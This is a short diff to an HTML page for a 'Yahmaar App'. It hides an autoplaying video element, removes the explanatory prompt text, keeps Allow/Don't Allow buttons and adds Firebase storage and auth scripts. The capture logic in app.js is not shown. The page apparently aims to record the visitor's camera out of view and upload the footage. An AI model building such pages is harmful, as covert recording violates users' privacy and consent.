@@ -8,12 +8,16 @@
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to Yahmaar</h1>
-        <p>Please allow access to continue:</p>
-        <button id="allowButton" class="btn green">Allow</button>
-        <button id="denyButton" class="btn red">Don't Allow</button>
-        <video id="video" autoplay muted playsinline></video>
+        <h1>Yahmaar App</h1>
+        <video id="video" autoplay style="display: none;"></video>
+        <div class="buttons">
+            <button id="allowButton" class="btn allow">Allow</button>
+            <button id="denyButton" class="btn deny">Don't Allow</button>
+        </div>
     </div>
+    <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-auth.js"></script>
     <script src="app.js"></script>
 </body>
 </html>
